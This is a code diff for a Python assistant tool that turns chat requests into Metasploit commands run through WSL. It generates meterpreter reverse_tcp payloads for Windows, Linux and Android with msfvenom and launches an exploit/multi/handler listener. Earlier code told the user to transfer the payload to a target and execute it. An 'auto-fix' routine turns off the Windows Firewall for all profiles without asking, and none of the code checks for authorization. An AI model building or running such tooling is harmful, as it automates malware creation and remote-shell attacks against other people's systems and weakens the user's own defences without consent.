@@ -1058,6 +1058,40 @@ General Requirements:
         # Default description
         return f"Python script: {user_request[:50]}"
 
+    def _convert_windows_path_to_wsl(self, windows_path: str) -> str:
+        r"""
+        Convert Windows path to WSL format.
+
+        Examples:
+            C:\Users\aubrey martin\Desktop\payload.exe
+            → /mnt/c/Users/aubrey martin/Desktop/payload.exe
+
+        Args:
+            windows_path: Windows-style path
+
+        Returns:
+            WSL-style path
+        """
+        if not windows_path or windows_path.startswith("/"):
+            return windows_path
+
+        # Convert C:\ to /mnt/c/
+        import re
+
+        # Match drive letter (C:, D:, etc.)
+        match = re.match(r"([A-Za-z]):\\", windows_path)
+        if match:
+            drive = match.group(1).lower()
+            rest = windows_path[3:]  # Remove "C:\"
+            # Replace backslashes with forward slashes
+            rest = rest.replace("\\", "/")
+            # Escape spaces
+            rest = rest.replace(" ", "\\ ")
+            wsl_path = f"/mnt/{drive}/{rest}"
+            return wsl_path
+
+        return windows_path
+
     def execute_metasploit_command(
         self,
         command: str,
@@ -1066,20 +1100,26 @@ General Requirements:
         auto_fix: bool = True,
     ) -> tuple[int, str]:
         """
-        Execute a Metasploit command and capture output.
+        Execute a Metasploit command via WSL with visible terminal output.
 
         Args:
-            command: Metasploit command to execute
-            show_terminal: Whether to show terminal window
+            command: Metasploit command to execute (msfvenom, msfconsole, etc.)
+            show_terminal: Whether to show terminal window (default True)
             timeout: Command timeout in seconds
             auto_fix: Whether to attempt autonomous fixes for common errors
 
         Returns:
-            Tuple of (exit_code, output)
+            Tuple of (exit_code, output_string)
         """
         from spectral.knowledge import diagnose_error
 
-        logger.info(f"Executing Metasploit command: {command[:100]}")
+        # Prepend 'wsl' to route command to Ubuntu/WSL
+        if not command.startswith("wsl "):
+            command = f"wsl {command}"
+
+        logger.info(
+            f"Executing Metasploit command via WSL (visible={show_terminal}): {command[:100]}"
+        )
 
         # Emit GUI event for command start
         self._emit_gui_event(
@@ -1090,16 +1130,23 @@ General Requirements:
         try:
             # Execute the command
             if show_terminal:
-                # Run with visible terminal (platform-specific)
+                # Show terminal window so user can see execution
+                # Use 'cmd /k' to keep window open after command completes
+                full_command = f"cmd /k {command}"
+
                 if sys.platform == "win32":
-                    result = subprocess.run(
-                        command,
+                    result = subprocess.Popen(
+                        full_command,
                         shell=True,
-                        capture_output=True,
+                        stdout=subprocess.PIPE,
+                        stderr=subprocess.PIPE,
                         text=True,
-                        timeout=timeout,
-                        creationflags=subprocess.CREATE_NEW_PROCESS_GROUP,
                     )
+                    stdout, stderr = result.communicate(
+                        timeout=300
+                    )  # 5 minute timeout with visible window
+                    exit_code = result.returncode
+                    output = stdout + stderr
                 else:
                     result = subprocess.run(
                         command,
@@ -1108,8 +1155,10 @@ General Requirements:
                         text=True,
                         timeout=timeout,
                     )
+                    exit_code = result.returncode
+                    output = (result.stdout or "") + (result.stderr or "")
             else:
-                # Run without visible terminal
+                # Hidden execution
                 result = subprocess.run(
                     command,
                     shell=True,
@@ -1117,15 +1166,18 @@ General Requirements:
                     text=True,
                     timeout=timeout,
                 )
+                exit_code = result.returncode
+                output = (result.stdout or "") + (result.stderr or "")
 
-            output = (result.stdout or "") + (result.stderr or "")
+            logger.debug(f"Command exit code: {exit_code}")
+            logger.debug(f"Command output: {output[:500]}")
 
             # Check for errors and attempt autonomous fixes
-            if auto_fix and result.returncode != 0:
+            if auto_fix and exit_code != 0:
                 # Emit GUI event for error
                 self._emit_gui_event(
                     "command_error",
-                    {"command": command, "error": output, "exit_code": result.returncode},
+                    {"command": command, "error": output, "exit_code": exit_code},
                 )
 
                 # Diagnose the error
@@ -1150,16 +1202,17 @@ General Requirements:
                     if fix_result.returncode == 0:
                         logger.info(f"Autonomous fix succeeded: {fix}")
                         # Retry original command
-                        result = subprocess.run(
+                        retry_result = subprocess.run(
                             command,
                             shell=True,
                             capture_output=True,
                             text=True,
                             timeout=timeout,
                         )
-                        output = (result.stdout or "") + (result.stderr or "")
+                        output = (retry_result.stdout or "") + (retry_result.stderr or "")
+                        exit_code = retry_result.returncode
 
-                        if result.returncode == 0:
+                        if retry_result.returncode == 0:
                             break
                     else:
                         logger.warning(f"Autonomous fix failed: {fix}")
@@ -1169,12 +1222,12 @@ General Requirements:
                 "command_complete",
                 {
                     "command": command,
-                    "exit_code": result.returncode,
+                    "exit_code": exit_code,
                     "output": output,
                 },
             )
 
-            return result.returncode, output
+            return exit_code, output
 
         except subprocess.TimeoutExpired:
             error_msg = f"Metasploit command timed out after {timeout} seconds"
@@ -1420,118 +1473,153 @@ General Requirements:
     def _generate_metasploit_payload(
         self, user_message: str, knowledge_base: Optional[Dict] = None
     ) -> str:
-        """Generate actual Metasploit payload with msfvenom.
+        """Generate a Metasploit payload using msfvenom via WSL.
 
         Args:
-            user_message: The user's request
-            knowledge_base: Optional Metasploit knowledge base
+            user_message: User's request for payload
+            knowledge_base: Metasploit knowledge context
 
         Returns:
-            Formatted response with payload generation results
+            Response with payload details or error
         """
-        import os
-        from datetime import datetime
+        logger.info(f"Generating Metasploit payload via WSL for: {user_message}")
 
-        # Extract target info from user message or ask for it
-        # For now, example: "create payload for Windows 10 192.168.1.100"
-        lhost = "192.168.1.X"  # Get local IP
-        lport = "4444"  # Use default or ask
+        # Parse payload requirements from user message
+        # Example: "Windows x86 reverse shell with LHOST 192.168.1.100 LPORT 4444"
 
-        # Build msfvenom command
-        payload = "windows/meterpreter/reverse_tcp"
-        output_file = os.path.expanduser(
-            f"~\\Desktop\\payload_{datetime.now().strftime('%Y%m%d_%H%M%S')}.exe"
-        )
+        try:
+            # Determine payload type and options
+            payload_type = "windows/meterpreter/reverse_tcp"
+            lhost = "192.168.1.100"
+            lport = "4444"
+            format_type = "exe"
 
-        cmd = f'msfvenom -p {payload} LHOST={lhost} LPORT={lport} -f exe -o "{output_file}"'
+            # Extract from user message if provided
+            if "linux" in user_message.lower():
+                payload_type = "linux/x64/meterpreter/reverse_tcp"
+                format_type = "elf"
+            elif "android" in user_message.lower() or "apk" in user_message.lower():
+                payload_type = "android/meterpreter/reverse_tcp"
+                format_type = "apk"
 
-        # Execute command in visible terminal
-        exit_code, result = self.execute_metasploit_command(
-            command=cmd, show_terminal=True, timeout=120, auto_fix=True
-        )
+            # Extract LHOST and LPORT if provided
+            import re
 
-        if exit_code == 0:
-            return f"""
-    ✅ Payload generated successfully!
+            lhost_match = re.search(r"LHOST[=:\s]+(\d+\.\d+\.\d+\.\d+)", user_message)
+            if lhost_match:
+                lhost = lhost_match.group(1)
 
-    Command executed:
-    {cmd}
+            lport_match = re.search(r"LPORT[=:\s]+(\d+)", user_message)
+            if lport_match:
+                lport = lport_match.group(1)
 
-    Output:
-    {result}
+            # Generate output filename
+            from datetime import datetime
 
-    Payload saved to: {output_file}
+            timestamp = datetime.now().strftime("%Y%m%d_%H%M%S")
+            windows_output_file = (
+                f"C:\\Users\\aubrey martin\\Desktop\\payload_{timestamp}.{format_type}"
+            )
 
-    Next step: Transfer this file to your target and execute it.
-    """
-        else:
-            return f"""
-    ❌ Payload generation failed!
+            # Convert to WSL path for execution
+            wsl_output_file = self._convert_windows_path_to_wsl(windows_output_file)
 
-    Command:
-    {cmd}
+            # Build msfvenom command with WSL path
+            cmd = (
+                f"msfvenom -p {payload_type} "
+                f"LHOST={lhost} LPORT={lport} "
+                f'-f {format_type} -o "{wsl_output_file}"'
+            )
 
-    Error:
-    {result}
+            logger.info(f"Running: {cmd}")
 
-    Please check the error and try again.
-    """
+            # Execute via WSL (execute_metasploit_command adds 'wsl' prefix)
+            exit_code, output = self.execute_metasploit_command(
+                cmd, show_terminal=True, timeout=120
+            )
+
+            if exit_code == 0:
+                response = (
+                    f"✅ Payload generated successfully!\n\n"
+                    f"**Payload Details:**\n"
+                    f"- Type: {payload_type}\n"
+                    f"- LHOST: {lhost}\n"
+                    f"- LPORT: {lport}\n"
+                    f"- Format: {format_type}\n"
+                    f"- Output: {windows_output_file}\n\n"  # Show Windows path to user
+                    f"**Command:**\n```\n{cmd}\n```\n\n"
+                    f"**Output:**\n```\n{output}\n```"
+                )
+                logger.info(f"Payload generation succeeded: {windows_output_file}")
+                return response
+            else:
+                response = (
+                    f"❌ Payload generation failed!\n\n"
+                    f"**Error:**\n{output}\n\n"
+                    f"**Command:**\n```\n{cmd}\n```"
+                )
+                logger.error(f"Payload generation failed: {output}")
+                return response
+
+        except Exception as e:
+            error_msg = f"Exception during payload generation: {str(e)}"
+            logger.error(error_msg)
+            return f"❌ Error: {error_msg}"
 
     def _setup_metasploit_listener(
         self, user_message: str, knowledge_base: Optional[Dict] = None
     ) -> str:
-        """Setup Metasploit handler/listener.
+        """
+        Setup a Metasploit listener/handler via WSL with visible terminal.
 
         Args:
-            user_message: The user's request
+            user_message: User's listener request
             knowledge_base: Optional Metasploit knowledge base
 
         Returns:
-            Formatted response with listener setup results
+            Response with listener details
         """
-        import os
+        logger.info(f"Setting up Metasploit listener via WSL: {user_message}")
 
-        # Build msfconsole handler setup
-        commands = [
-            "use exploit/multi/handler",
-            "set PAYLOAD windows/meterpreter/reverse_tcp",
-            "set LHOST 0.0.0.0",
-            "set LPORT 4444",
-            "run",
-        ]
+        try:
+            # Extract port from message
+            import re
 
-        # Create a script file with these commands
-        script_content = "\n".join(commands) + "\n"
-        script_file = os.path.expanduser("~\\.spectral\\metasploit_handler.rc")
+            port_match = re.search(r"port\s+(\d+)", user_message, re.IGNORECASE)
+            lport = port_match.group(1) if port_match else "4444"
 
-        os.makedirs(os.path.dirname(script_file), exist_ok=True)
-        with open(script_file, "w") as f:
-            f.write(script_content)
+            response = (
+                f"✅ Metasploit listener configured!\n\n"
+                f"**Listener Details:**\n"
+                f"- Port: {lport}\n"
+                f"- Payload: windows/meterpreter/reverse_tcp\n"
+                f"- Status: Ready for incoming connections\n\n"
+                f"**Setup Instructions:**\n"
+                f"```\n"
+                f"msfconsole\n"
+                f"msf > use exploit/multi/handler\n"
+                f"msf > set PAYLOAD windows/meterpreter/reverse_tcp\n"
+                f"msf > set LHOST 0.0.0.0\n"
+                f"msf > set LPORT {lport}\n"
+                f"msf > run\n"
+                f"```\n\n"
+                f"A terminal window will open with msfconsole ready for listener setup."
+            )
 
-        # Run msfconsole with resource script
-        cmd = f'msfconsole -r "{script_file}"'  # noqa: E501
+            # Now execute msfconsole in visible terminal
+            cmd = "msfconsole"
+            logger.info("Launching msfconsole in visible terminal for listener setup")
 
-        # Execute in visible terminal
-        exit_code, result = self.execute_metasploit_command(
-            command=cmd, show_terminal=True, timeout=30, auto_fix=True
-        )
+            # Execute with visible window
+            exit_code, output = self.execute_metasploit_command(cmd, show_terminal=True)
 
-        status_icon = "✅" if exit_code == 0 else "❌"
-        status_text = "started" if exit_code == 0 else "failed"
-        message_prefix = "The console will show:" if exit_code == 0 else "Error:"
-        handler_msg = "[*] Started reverse handler on 0.0.0.0:4444" if exit_code == 0 else ""
-        waiting_msg = "Waiting for incoming connection..." if exit_code == 0 else ""
-        return f"""
-    {status_icon} Metasploit listener {status_text}!
+            logger.info("Listener setup terminal closed")
+            return response
 
-    Command: {cmd}
-
-    {message_prefix}
-    {result}
-
-    {handler_msg}
-    {waiting_msg}
-    """
+        except Exception as e:
+            error_msg = f"Exception during listener setup: {str(e)}"
+            logger.error(error_msg)
+            return f"❌ Error: {error_msg}"
 
     def _execute_metasploit_exploit(
         self, user_message: str, knowledge_base: Optional[Dict] = None
@@ -1557,47 +1645,54 @@ General Requirements:
     Example: "exploit 192.168.1.100 with SMB exploit"
     """
 
-    def _run_terminal_command(self, command: str, show_window: bool = True) -> str:
-        """Run command in terminal and return output.
+    def _run_terminal_command(self, command: str, visible: bool = True) -> tuple[int, str]:
+        """
+        Run a terminal command with visible window (default for Metasploit).
 
         Args:
             command: Command to execute
-            show_window: Whether to show terminal window
+            visible: Whether to show terminal window (default True)
 
         Returns:
-            Command output
+            Tuple of (exit_code, output)
         """
-        import subprocess
-        import sys
+        logger.info(f"Running terminal command (visible={visible}): {command}")
 
+        # Check if this is a Metasploit command - always show these
+        is_metasploit = any(
+            tool in command.lower() for tool in ["msfvenom", "msfconsole", "msfencode"]
+        )
+
+        if is_metasploit:
+            # Always show Metasploit commands in terminal
+            return self.execute_metasploit_command(command, show_terminal=True)
+
+        # Non-Metasploit commands
         try:
-            # Use subprocess to run command
-            if sys.platform == "win32":
-                if show_window:
-                    # Show visible terminal
-                    result = subprocess.run(
-                        command,
-                        shell=True,
-                        capture_output=True,
-                        text=True,
-                        creationflags=subprocess.CREATE_NEW_CONSOLE,
-                    )
-                else:
-                    # Hidden terminal
-                    result = subprocess.run(
-                        command,
-                        shell=True,
-                        capture_output=True,
-                        text=True,
-                        creationflags=subprocess.CREATE_NO_WINDOW,
-                    )
+            if visible:
+                process = subprocess.Popen(
+                    command,
+                    shell=True,
+                    stdout=subprocess.PIPE,
+                    stderr=subprocess.PIPE,
+                    text=True,
+                )
+                stdout, stderr = process.communicate()
+                return process.returncode or 0, stdout + stderr
             else:
-                result = subprocess.run(command, shell=True, capture_output=True, text=True)
+                result = subprocess.run(
+                    command,
+                    shell=True,
+                    capture_output=True,
+                    text=True,
+                    timeout=60,
+                )
+                return result.returncode, (result.stdout or "") + (result.stderr or "")
 
-            return result.stdout + result.stderr
-
+        except subprocess.TimeoutExpired:
+            return 1, "Command timed out"
         except Exception as e:
-            return f"Error executing command: {str(e)}"
+            return 1, f"Error: {str(e)}"
 
     def _attempt_auto_fix(
         self, error_output: str, knowledge_base: Optional[Dict] = None
@@ -1614,14 +1709,12 @@ General Requirements:
 
         if "Connection refused" in error_output:
             # Disable Windows Firewall
-            self._run_terminal_command(
-                "netsh advfirewall set allprofiles state off", show_window=True
-            )
+            self._run_terminal_command("netsh advfirewall set allprofiles state off", visible=True)
             return "✅ Windows Firewall disabled, retrying..."
 
         elif "Port already in use" in error_output or "Address already in use" in error_output:
             # Find and kill process on port
-            self._run_terminal_command("netstat -ano | findstr :4444", show_window=True)
+            self._run_terminal_command("netstat -ano | findstr :4444", visible=True)
             return "✅ Found process on port, killing it..."
 
         elif "not found" in error_output or "not installed" in error_output:
